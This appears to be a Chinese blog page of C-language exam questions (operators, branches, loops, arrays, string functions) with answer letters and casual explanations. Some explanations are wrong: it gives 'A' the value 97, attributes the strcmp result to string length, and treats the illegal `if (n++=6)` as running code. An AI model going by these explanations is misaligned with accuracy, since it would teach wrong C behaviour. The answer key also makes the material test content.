<p>若a和b是整型变量，<code>(a+b)++</code> 是非法的。在C语言中，后缀自增运算符<code>++</code>只能用于变量，而不能用于表达式。</p>
<p><code>&quot;A&quot; * &#39;B&#39;</code> 是非法的。C语言中，乘法运算符<code>*</code>只可以用于数值类型的操作数，而不可以用于字符类型的操作数。</p>
<p>在C语言中，字符串类型是用字符数组表示的，而不是简单的字符。字符串常量可以被表示为<code>&quot;A&quot;</code>这样的字符数组，但是不能直接进行加法运算。</p>
<h2 id="34"><a href="#34" class="headerlink" title="34"></a>34</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">42．以下程序段运行后变量a的值为（D）</span><br><span class="line">int x=6,y=5;</span><br><span class="line">int a;</span><br><span class="line">a=(--x==y++)?x:y+1;</span><br><span class="line">Ａ．０　　Ｂ．１　　Ｃ．６　　Ｄ．５</span><br></pre></td></tr></table></figure>

<p>括号中的表达是真的，所以会选择x，而x进行过自减操作，所以为5</p>
<h2 id="35"><a href="#35" class="headerlink" title="35"></a>35</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">43.下面程序段的运行结果是( D )</span><br><span class="line">int a =5 b=6;printf (“%d”,a/b);</span><br><span class="line">A. 5     B.   6       C. 7      D. 0</span><br></pre></td></tr></table></figure>

<p>整数相除会忽略掉小数部分，所以是0</p>
<h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">44.以下程序的运行结果是( D  )</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">int a=65;</span><br><span class="line">char c=’A’;</span><br><span class="line">printf(“%x,%d”,a,c);</span><br><span class="line">&#125;</span><br><span class="line">A.65,       B.41,       C.65,65       D.41,65</span><br></pre></td></tr></table></figure>

<p><code>%x</code> 的格式说明符用于打印变量 a 的十六进制表示，<code>%d</code> 的格式说明符用于打印变量 c 的十进制表示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%d：用于打印有符号十进制整数。</span><br><span class="line">%u：用于打印无符号十进制整数。</span><br><span class="line">%f：用于打印浮点数。</span><br><span class="line">%c：用于打印单个字符。</span><br><span class="line">%s：用于打印字符串。</span><br><span class="line">%x 或 %X：用于打印无符号十六进制整数，字母可以是小写或大写。</span><br><span class="line">%o：用于打印八进制整数。</span><br><span class="line">%p：用于打印指针地址。</span><br><span class="line">%e 或 %E：用于打印科学计数法表示的浮点数。</span><br><span class="line">%g 或 %G：根据实际情况自动选择 %f 或 %e 表示浮点数。</span><br><span class="line">%%：用于打印一个百分号。</span><br></pre></td></tr></table></figure>

<p>因此，<code>%x,%d</code> 会将变量 a 的值 65 打印为 41（十六进制表示），变量 c 的值 ‘A’ 打印为 65（十进制表示）。</p>
<p>排除法都选D吧</p>
<h1 id="选择结构程序设计"><a href="#选择结构程序设计" class="headerlink" title="选择结构程序设计"></a>选择结构程序设计</h1><h2 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.C语言对于计嵌套语句的规定：else总是与（B）配对</span><br><span class="line">A.第一个if</span><br><span class="line">B.之前最近且尚未配对</span><br><span class="line">C.缩进位置相同的if</span><br><span class="line">D.之前最近的if</span><br></pre></td></tr></table></figure>

<p>这个是规定哈</p>
<h2 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、以下程序运行结果是（D）</span><br><span class="line">void  main(   )</span><br><span class="line">&#123; int n=5;</span><br><span class="line"> if ( n++=6 )</span><br><span class="line"> printf( “% d\n” , n);</span><br><span class="line"> else</span><br><span class="line"> printf ( “%d\n” ,  ++n );</span><br><span class="line">&#125;</span><br><span class="line">A、4      B、5     C、6      D、7</span><br></pre></td></tr></table></figure>

<p>这个也不用多说，加了两次，第一次判断的时候是先调用再增加。</p>
<h2 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.以下程序段运行后的值为（　B　）</span><br><span class="line">int a[]=&#123;1,2,3&#125;,b[]=&#123;4,2,5&#125;;</span><br><span class="line">int *p,*q;</span><br><span class="line">int i,x;</span><br><span class="line">p=a;q=b;</span><br><span class="line">for(i=0;i&lt;3;i++)</span><br><span class="line">    if(*(p+i)==*(q+i))</span><br><span class="line">         x=*(p+i)*2;</span><br><span class="line">Ａ．２　　Ｂ．４　　Ｃ．６　　Ｄ．不确定</span><br></pre></td></tr></table></figure>

<p>这个也不多说，是个人就看的出来好吧，大概说说就是p和q都是指向那两个数组头地址的指针，加i就是表示第几个元素。</p>
<h2 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.若有定义:int a=1,b=2,c=3;则执行以下程序后a,b,c的值分别为( D )</span><br><span class="line">if(a＜b) &#123;c=a,a=b,b=c;&#125;</span><br><span class="line">A.a=1 b=2, c=3       B.a=2 b=3 c=1      C.a=2 b=3 c=3     D.a=2 b=1,c=1</span><br></pre></td></tr></table></figure>

<p>条件打成执行大括号里面的语句，然后就是c=1，a=2,b=1.</p>
<p>直接就选d了</p>
<h2 id="5-2"><a href="#5-2" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.以下程序的运行结果是（C）</span><br><span class="line">void main (  )</span><br><span class="line">&#123; int n=‘e’；</span><br><span class="line">switch (n--)</span><br><span class="line">&#123;default: printf (“error”);</span><br><span class="line">case‘a’：</span><br><span class="line">case‘b’: printf(“good”); break;</span><br><span class="line">case‘c’: printf(“pass”);</span><br><span class="line">case‘d’: printf(“warn”);</span><br><span class="line">&#125;</span><br><span class="line">A、error      B、good</span><br><span class="line">C、error good      D、warn</span><br></pre></td></tr></table></figure>

<p>这个很简单啊，switch会依次执行嘛，遇到break停止。e没有匹配到，就执行默认，然后依次执行。</p>
<h1 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a><strong>循环控制</strong></h1><h2 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对于整型变量x，与while（！x）等价的是（B）</span><br><span class="line">A.while（x！=0）    B.while（x==0）   C.while（x！=1）    D.while（～x）</span><br></pre></td></tr></table></figure>

<h2 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.以下程序运行后，循环体运行的次数为（ B ）</span><br><span class="line">int i=10,x;</span><br><span class="line">for( ;i&lt;10;i++)</span><br><span class="line">       x=x+i;</span><br><span class="line">A．10		B．0</span><br><span class="line">C．1		D．无限</span><br></pre></td></tr></table></figure>

<p>你这个i都不小于10，执行个jb</p>
<h2 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.设有整型变量x，下述语句（ B ）不会出现死循环</span><br><span class="line">A、for( ; ; x+=1);</span><br><span class="line">B、for(; (x=getchar( ))!=‘\n’; );</span><br><span class="line">C、while (1) &#123;x++;&#125;</span><br><span class="line">D、for(x=10; ; x--);</span><br></pre></td></tr></table></figure>

<p>b嘛，一看知道了，当x不等于换行符的时候就执行，是换行符的时候就停止执行。</p>
<h2 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4、在C语言中while循环和do—while循环的主要区别是（ B ）</span><br><span class="line">A、do—while 循环体内可以使用break语句， while循环体内不能使用break语句</span><br><span class="line">B、do—while的循环至少无条件执行一次，while的循环体不是</span><br><span class="line">C、do—while 循环体内可以使用continue语句，while循环体内不能使用continue语句</span><br><span class="line">D、while的循环体至少无条件执行一次，do—while的循环体不是</span><br></pre></td></tr></table></figure>

<p>这个不多说，不知道的立即推好了</p>
<h2 id="5-3"><a href="#5-3" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5、对于整型变量x和y，语句for (x=0, y=0 ; (y!=123) ＆＆(x&lt;4); x++) y++;中的“y++;”被执行（ A ）</span><br><span class="line">A、4次     B、0次</span><br><span class="line">C、123次     D、3次</span><br></pre></td></tr></table></figure>

<p>这个也不多说了好吧，中间是与，但是也没影响，毕竟y加不到123次，只用看x执行了多少次即可。</p>
<h2 id="6-2"><a href="#6-2" class="headerlink" title="6"></a>6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6．以下程序段运行后变量n的值为（ D ）</span><br><span class="line">int i=1,n=1;</span><br><span class="line">for( ; i&lt;3;i++)</span><br><span class="line">    &#123;</span><br><span class="line">     continue;</span><br><span class="line">     n=n+i;</span><br><span class="line">     &#125;</span><br><span class="line">Ａ．４　　Ｂ．３　Ｃ．２　　Ｄ．１</span><br></pre></td></tr></table></figure>

<p>因为continue语句体检结束了循环，所以n的值不变哈，就是还是1.</p>
<p>在程序段中的 <code>for</code> 循环中，使用了 <code>continue</code> 语句，当 <code>continue</code> 被执行时，它会跳过当前循环中剩余的代码，并进入下一次循环迭代。</p>
<h2 id="7-2"><a href="#7-2" class="headerlink" title="7"></a>7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7．设有如下程序段：</span><br><span class="line">int a[3][3]=&#123;1,0,2,1,0,2,1,0,1&#125;,i,j,s=0; </span><br><span class="line">for(i=0;i&lt;3;i++)</span><br><span class="line">    for(j=0;j&lt;i;j++)</span><br><span class="line">        s=s+a[i][j];</span><br><span class="line">则执行该程序段后，s的值是（ C ）</span><br><span class="line">Ａ．０　  　Ｂ．１　　  Ｃ．２　　 Ｄ．３</span><br></pre></td></tr></table></figure>

<p>这个双重循环倒是可以一步步的慢慢分析了，第一步的时候i就是0，注意在最外面一层循环结束之前，都不会执行i++所以第一次循环i和j的值都是0不会执行语句。</p>
<p>第二步的时候，i增加了，i为1，j循环就执行1次，执行的时候，i为1，j为0，s=1</p>
<p>第三部的时候，i为2，j就循环执行2此，执行的时候，i为2，j为0，1，s=1+1+0</p>
<p>第四步，i为3，不执行语句。</p>
<h2 id="8-2"><a href="#8-2" class="headerlink" title="8"></a>8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.以下程序运行结果（C）</span><br><span class="line">void main() </span><br><span class="line">&#123;</span><br><span class="line">int sum=0,item=0;</span><br><span class="line"> while(item＜5)    </span><br><span class="line">&#123;                 </span><br><span class="line">item++; </span><br><span class="line">sum+=item;</span><br><span class="line">if(sum＞=6) break;</span><br><span class="line">&#125;</span><br><span class="line">printf(“%d\n”,sum) ;</span><br><span class="line">&#125;</span><br><span class="line">A.10          B.15</span><br><span class="line">C.6         D.7</span><br></pre></td></tr></table></figure>

<p>就是这种题才有意思啊喂，比之前那些文字游戏好玩多了好吧😎</p>
<p>首先就是item为0，开始执行，首先自增为1，然后sun加为1，如果sum大于6就结束，但是不是捏。</p>
<p>然后第2次循环，item为1，进入，然后自增为2.sum增加为3，结束。</p>
<p>第3次循环，item为2，进入，然后自增为3，sum加为6，结束此循环。</p>
<p>输出sum为6</p>
<h2 id="9-2"><a href="#9-2" class="headerlink" title="9"></a>9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9.下面程序运行结果是( A )</span><br><span class="line">int  i=0,a[] =&#123;1,2,3,4,5&#125;;</span><br><span class="line">do&#123;</span><br><span class="line">a[i]+=10;</span><br><span class="line">&#125;while(a[++i]＞2);</span><br><span class="line">for(i=0;i&lt;5;i++)</span><br><span class="line">printf(“%d”,a[i]);</span><br><span class="line">A.11 2 3 4 5</span><br><span class="line">B.1 2 3 4 5</span><br><span class="line">C.11 12 13 14 15</span><br><span class="line">D.11 12 3 4 5</span><br></pre></td></tr></table></figure>

<p>dowhile形式，会先执行do里面的内容然后再判断哈。</p>
<p>首先给a数组里面第一个元素加了个10.</p>
<p>然后while，++i=1，a[1]=2不执行，然后就跳出循环（者循环里面也没东西啊，注意while后面的分号）</p>
<p>然后执行for循环，循环输出数组中的内容，就是那里面的内容。</p>
<h2 id="10-2"><a href="#10-2" class="headerlink" title="10"></a>10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.若有定义:int i=0,x=0; int a[3][3]=&#123;1,2,3,4,5,6,7,8,9&#125;则以下程序段运行后x的值为( C )</span><br><span class="line">  for( ;i＜3;i++) x+=a[i][2-i]；</span><br><span class="line">A.0      B.12</span><br><span class="line">C.15      D.18</span><br></pre></td></tr></table></figure>

<p>for循环，i是0，执行三次。</p>
<p>第一次，i是0，x是3</p>
<p>第二次，i=1，x=3+5</p>
<p>第三次，i=2，x=8+7=15</p>
<h2 id="11-2"><a href="#11-2" class="headerlink" title="11"></a>11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11.以下程序的运行结果是( B )</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">int sum=0,item=0;</span><br><span class="line">while (item＜5)</span><br><span class="line">&#123;</span><br><span class="line">item++;</span><br><span class="line">sum+=item;</span><br><span class="line">if(sum==5) </span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">printf(“%d\n”,sum);</span><br><span class="line">&#125;</span><br><span class="line">A. 10        B.15       C.5      D.6</span><br></pre></td></tr></table></figure>

<p>当sum到5的时候，退出循环。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次，item=0，1，sum=1</span><br><span class="line">第二次，item=1，2.sum=1+2</span><br><span class="line">第三次，item=2，3，sum=3+3=6</span><br><span class="line">第四次，item=3，4，sum=6+4</span><br><span class="line">第五次，item=4，5，sum=10+5</span><br><span class="line">第六次，item=5，不循环。输出15</span><br></pre></td></tr></table></figure>

<h2 id="12-2"><a href="#12-2" class="headerlink" title="12"></a>12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12.下面程序段的运行结果是( D )</span><br><span class="line">int i=O, a[]=&#123;3,4,5,4,3&#125;;</span><br><span class="line">do&#123;</span><br><span class="line">a[i]++;</span><br><span class="line">&#125;while(a[++i]＜5);</span><br><span class="line">for(i=0;i＜5;i++)</span><br><span class="line">printf(“%d”,a[i]) ;</span><br><span class="line">A.  45654      B.34543    C.45554      D.45543</span><br></pre></td></tr></table></figure>

<p>开始分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次，先把第一个元素变成4，这个时候第二个元素为4，小于5，执行循环</span><br><span class="line">第二次，第二个元素变成5，第三个元素为5，不循环。输出45543</span><br></pre></td></tr></table></figure>

<h2 id="13-2"><a href="#13-2" class="headerlink" title="13"></a>13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13.下面程序段的运行结果是( C )</span><br><span class="line">int i=0,a[]=&#123;7,5,7,3,8,3&#125;;</span><br><span class="line">do&#123;</span><br><span class="line">a[i]+=2;</span><br><span class="line">&#125;while(a[++i]＞5);</span><br><span class="line">for(i=0;i＜6;i++)</span><br><span class="line">printf(“%d ”,a[i]);</span><br><span class="line">A. 9 7 9 5 10 5    B.9 5 9 3 10 3   C.  9 5 7 3 8 3     D.7 5 7 3 8 3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次，先把第一个元素变成9，然后第二个元素5不大于5，不执行循环。</span><br><span class="line">直接进入下面的for循环，循环输出数组中的内容</span><br><span class="line">数组中的内容只修改了第一个元素，所以就是</span><br><span class="line">957383</span><br></pre></td></tr></table></figure>



<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>我是无情的码字机器，我是腱鞘炎单推人😎</p>
<h2 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、有如下定义  int a[ ][3]=&#123;1，2，3，4，5，6，7，8，&#125;；则数组a的行数（ B ）</span><br><span class="line">A、 2     B、 3</span><br><span class="line">C、 4  D、无法确定</span><br></pre></td></tr></table></figure>

<p>每行三个元素，一个一个数不就好，没定义的用0补齐。所以是3行</p>
<h2 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.以下数组定义中，正确的是（ D ）</span><br><span class="line">A.int a[2] [3]=&#123;1，2，3，4，5，6，7&#125;； </span><br><span class="line">B.int a[] []=&#123;&#123;1，2，3&#125;，&#123;4，5，6&#125;，&#123;7，8，9&#125;&#125;；</span><br><span class="line">C.int a[2] []=&#123;1，2，3，4，5，6&#125;；    </span><br><span class="line">D.int a[] [4]=&#123;6&#125;；</span><br></pre></td></tr></table></figure>

<p>在 C/C++ 中，如果要声明多维数组并对其进行初始化，每个维度（除了第一维）都需要指定大小。这是因为编译器需要知道每个维度的大小来正确分配内存和处理索引。</p>
<p>反正最后一个必须要有定义，然后A选项中，定义的时候多了个元素。</p>
<h2 id="3-4"><a href="#3-4" class="headerlink" title="3"></a>3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.若有定义:int a=6,b=2;ch1ar C1=‘a’，C2=‘b’；则表达式a+b%5+C2-C1的值是（ C ）</span><br><span class="line">A .7       B.8</span><br><span class="line">C.9      D表达式错误</span><br></pre></td></tr></table></figure>

<p>‘a’的值97，’A‘的是97.</p>
<p>然后b是98，现在开始算，b%5就是2，所以答案就是，6+2+98-97最后算出来就是9</p>
<h2 id="4-4"><a href="#4-4" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.若有定义：char str[6]=“abcdm”，*ps，*str2=“abcdef”；正确的是（ B ）</span><br><span class="line">A.stycpy（str1，str2）；</span><br><span class="line">B.表达式strcmp（str1，str2）的值＞0</span><br><span class="line">C.str1=str2；</span><br><span class="line">D.表达式strlen（str1）的值为6</span><br></pre></td></tr></table></figure>

<p><strong>函数解释</strong></p>
<p><code>strcpy</code>函数是C语言中的字符串函数之一，用于将一个字符串复制到另一个字符串中.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strcmp函数的作用是比较两个字符串，返回一个整数值。具体的返回值有以下几种情况：</span><br><span class="line"></span><br><span class="line">如果 str1 和 str2 相等，则返回 0。</span><br><span class="line">如果 str1 大于 str2，则返回一个正整数（大于 0）。</span><br><span class="line">如果 str1 小于 str2，则返回一个负整数（小于 0）。</span><br></pre></td></tr></table></figure>

<p>strlen函数接受一个参数，即需要计算长度的字符串（str），并返回一个 size_t 类型的值，表示字符串的长度。</p>
<p><strong>题目解析</strong></p>
<p>这道题都没说明str1和2到底是谁我们只能猜测前面那个是str1后面那个是str2.然后看我之前解析的函数就可以知道答案了，第一个字符串是比第二个字符串的长度大的所以b返回正值。</p>
<h2 id="5-4"><a href="#5-4" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.以下能对一维数组a进行正确初始化的语句是（ D ）</span><br><span class="line">A.int a[5]=（0，0，0，0，0，）        B.int a[5]=[0] </span><br><span class="line">C.int a[5]=&#123;1，2，3，4，5，6，7&#125;     D.int a[]=&#123;0&#125;</span><br></pre></td></tr></table></figure>

<p>数组只能用花括号定义啊，然后c选项又多定义了2个元素</p>
<h2 id="6-3"><a href="#6-3" class="headerlink" title="6"></a>6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.以下( A )是不正确的字符串常量</span><br><span class="line">A.‘abc’      B.“12′12”     C.“O”     D“ ”</span><br></pre></td></tr></table></figure>

<p>A. ‘abc’ 是不正确的字符串常量。在 C 语言中，字符串常量应该使用双引号 “ 来表示，而不是单引号 ‘。单引号用于表示字符常量。</p>
<p>B. “12’12” 是正确的字符串常量。虽然其中包含了单引号字符，但是它是一个有效的字符串，因为它是由双引号包围的。</p>
<p>C. “O” 是正确的字符串常量。它只包含一个字符，由双引号包围。</p>
<p>D. “ “ 是正确的字符串常量，表示一个空字符串。它由双引号包围，但不包含任何字符。</p>
<h2 id="7-3"><a href="#7-3" class="headerlink" title="7"></a>7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7.设有如下定义：char str[8]=&#123;“Fujian”&#125;；则分配给数组str的存储空间是（C）字节</span><br><span class="line">A.6         B.7</span><br><span class="line">C.8         D.9</span><br></pre></td></tr></table></figure>

<p>一个字符占一个字节，8个元素就是8个字节</p>
<h2 id="8-3"><a href="#8-3" class="headerlink" title="8"></a>8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.下列数组定义中,正确的是( A )</span><br><span class="line">A.int a[10]</span><br><span class="line">B.int n=10  a[n];</span><br><span class="line">C.int N=10;int a[N]; </span><br><span class="line">D.int n; scant(“%d”,＆n);int a[n]</span><br></pre></td></tr></table></figure>

<p>额第一个怎么看都是正确的吧，第二个的n是什么鬼啊喂！而且如果第二个是对的了那第一个肯定是对的吧喂，出题人是什么脑回路？</p>
<p>最后一个也不说了好吧，第二个是错的你第三个就能对了？</p>
<p>最后一个，C语言中，数组的大小必须是在编译时就确定的，而不能在运行时根据用户的输入来决定。</p>
<p>在 C 语言中，数组的大小必须是一个整型常量表达式。数组的大小应该在编译时就确定。</p>
<h2 id="9-3"><a href="#9-3" class="headerlink" title="9"></a>9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9.若有定义int a[2][3];则对数组元素的非法引用是( D )</span><br><span class="line">A.a[0][1/2]      B.a[1][1]</span><br><span class="line">C.a[4-4][0]      D.a[0][3]</span><br></pre></td></tr></table></figure>

<p>首先值得注意的是，上面那一题我们也说过了，数组的大小必须是整数常量的表达式，注意是表达式哈。</p>
<p>最后一个，是超出范围引用了。</p>
<h2 id="10-3"><a href="#10-3" class="headerlink" title="10"></a>10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.若有int a=2 则a=strcmp(“miss”,“miss”)运行后a的值为（B）</span><br><span class="line">A.1        B.0 </span><br><span class="line">C.-1.      D.2</span><br></pre></td></tr></table></figure>

<p>cmp是比较两个字符串，一样的话就返回0</p>
<h2 id="11-3"><a href="#11-3" class="headerlink" title="11"></a>11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11.以下程序结束后屏幕输出（B）</span><br><span class="line">char str[]=“ab\\cd”;printf(“%d”,strlen(str));</span><br><span class="line">A.4.       B.5 </span><br><span class="line">C.6          D.7</span><br></pre></td></tr></table></figure>

<p>我草，我要是在考研这道题就错了！！</p>
<p>中间那两个斜杠是转义！！所以其实只有五个字符在里面！</p>
<h2 id="12-3"><a href="#12-3" class="headerlink" title="12"></a>12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12.已知int a[10]；则对a数组元素引用不正确的是（ A ）</span><br><span class="line">A．a[10]		B．a[3+5]</span><br><span class="line">C．a[10-10]		D．a[5] </span><br></pre></td></tr></table></figure>

<p>第一个明显超出范围了好吧</p>
<h2 id="13-3"><a href="#13-3" class="headerlink" title="13"></a>13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13.设有以下变量定义：</span><br><span class="line">char str1[]=”string”,str2[8],*str3,*str4=”string”;</span><br><span class="line">则（ A ）是正确的</span><br><span class="line">A．strcpy(str1,”china”)；		    B．str2=”china”；</span><br><span class="line">C．strcpy(*str3,”china”)；		D．strcpy(str4[0],”china”)；</span><br></pre></td></tr></table></figure>

<p>B. <code>str2 = &quot;china&quot;;</code> 是错误的语句。在 C 语言中，字符串不能直接用赋值操作符 <code>=</code> 赋值给数组。如果想要将一个字符串的内容赋值给数组，应该使用 <code>strcpy()</code> 函数。</p>
<p>C. <code>strcpy(*str3, &quot;china&quot;);</code> 是错误的语句。由于 <code>str3</code> 是一个指针变量，它指向某个地址。在使用指针指向的地址之前，必须先为其分配内存。否则，将无法使用 <code>strcpy()</code> 函数来复制字符串。</p>
<p>D. <code>strcpy(str4[0], &quot;china&quot;);</code> 是错误的语句。在给定的变量定义中，<code>str4</code> 是一个指向字符串常量的指针，它的内容是只读的，不能对其进行修改。</p>
<h2 id="14-2"><a href="#14-2" class="headerlink" title="14"></a>14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">14、以下能对一维数组a进行正确初始化的语句是（ D ）</span><br><span class="line">A、int a[5]=(0, 0, 0, 0, 0);           B、int a [s]=[0];</span><br><span class="line">C、int a[5]=&#123;1, 2, 3, 4, 5, 6, 7 &#125;;    D、int a [ ] = &#123;0&#125;;</span><br></pre></td></tr></table></figure>

<p>花括号，c选项超出范围</p>
<h2 id="15-2"><a href="#15-2" class="headerlink" title="15"></a>15</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15. 若有定义int a [ ] [ 3 ]=&#123;1,2,3,4,5,6,7,8,9&#125;;则表达式sizeof(a)/sizeof(a[0])的值为( A )</span><br><span class="line">A、3      B、4      C、5      D、9</span><br></pre></td></tr></table></figure>

<p>9除以3，所以是3</p>
<h2 id="16-2"><a href="#16-2" class="headerlink" title="16"></a>16</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">16、下列数组定义中，正确的是（ A ）</span><br><span class="line">A. int a[5]=&#123;0&#125;;</span><br><span class="line">B、int a[ ]=&#123;0 1 2&#125;;</span><br><span class="line">C、int a[5]=0</span><br><span class="line">D、int a [ ]</span><br></pre></td></tr></table></figure>

<p>第二个看着是对的，但是没有逗号。</p>
<h2 id="17-2"><a href="#17-2" class="headerlink" title="17"></a>17</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17、以下数组定义中，正确的是（ D ）</span><br><span class="line">A、int a[2][3]=&#123;1,2,3,4,5,6,7&#125;;</span><br><span class="line">B、int a[ ][ ]=&#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;, &#123;7,8,9&#125;&#125;;</span><br><span class="line">C、int a[2][ ]=&#123;1,2,3,4,5,6&#125;;</span><br><span class="line">D、int a[ ][4]=&#123;6&#125;</span><br></pre></td></tr></table></figure>

<p>这个学长的答案又错了，答案是D。必须要给最小的那个数组赋值！</p>
<h2 id="18-1"><a href="#18-1" class="headerlink" title="18"></a>18</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18.若有定义:int a[3][4]=&#123;&#123;1,2&#125;,&#123;0&#125;,&#123;1,2,3&#125;&#125;;则a[1][1]的值为( A )</span><br><span class="line">A.0.    B.&#123;1,2&#125;    C.1    D.3</span><br></pre></td></tr></table></figure>

<p>这个就是0.别想其他的了哈（你是1？🤗）</p>
<h2 id="19-1"><a href="#19-1" class="headerlink" title="19"></a>19</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">19.若有定义:int a[3]=&#123;0,1,2&#125;;则a[1]的值为( B )</span><br><span class="line"> A.0    B. 1</span><br><span class="line"> C.2      D.3</span><br></pre></td></tr></table></figure>

<p>写错了的自己立即推</p>
<h2 id="20-1"><a href="#20-1" class="headerlink" title="20"></a>20</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20．若有定义：int a[5]=&#123;1,2,3,4,5&#125;;则语句a[1]=a[3]+a[2+2]-a[3-1];运行后a[1]的值为（ A ）</span><br><span class="line">Ａ．６  　Ｂ．５    Ｃ．１  　Ｄ．２</span><br></pre></td></tr></table></figure>

<p>大概就是4+5-3所以是6</p>
<h2 id="21-1"><a href="#21-1" class="headerlink" title="21"></a>21</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">21.有如下定义:char str[6]=&#123;‘a’,‘b’,‘\0’，‘d’，‘e’，‘f’&#125;；则语句printf(“%s”,str);的输出结果是( D )</span><br><span class="line">A.ab\         B.abdef</span><br><span class="line">C.ab\0         D.ab</span><br></pre></td></tr></table></figure>

<p>\0是结束符号。别忘了哈</p>
<h2 id="22-1"><a href="#22-1" class="headerlink" title="22"></a>22</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22.定义char a[]=“abcdef”；char b[]=“xyz”;以下程序运行后输出（ B ）</span><br><span class="line">strcpy（a，b）；</span><br><span class="line">printf（“%c”，a[2]）；</span><br><span class="line">A. c     B.  z      C.\0     D.d</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[] = <span class="string">&quot;abcdef&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> b[] = <span class="string">&quot;xyz&quot;</span>;</span><br><span class="line">	<span class="built_in">strcpy</span>(a, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//输出xyz</span></span><br></pre></td></tr></table></figure>

<p>这个是直接把那个b里面的内容弄进去了，直接覆盖了。所以答案选B</p>
<h2 id="23-1"><a href="#23-1" class="headerlink" title="23"></a>23</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23、以下程序段运行后屏幕输出为（ A ）</span><br><span class="line">char str[80]; </span><br><span class="line">strcpy(str, “hello”); </span><br><span class="line">printf( “%d” , strlen (str));</span><br><span class="line">A、5    B、6     C、7     D、80</span><br></pre></td></tr></table></figure>

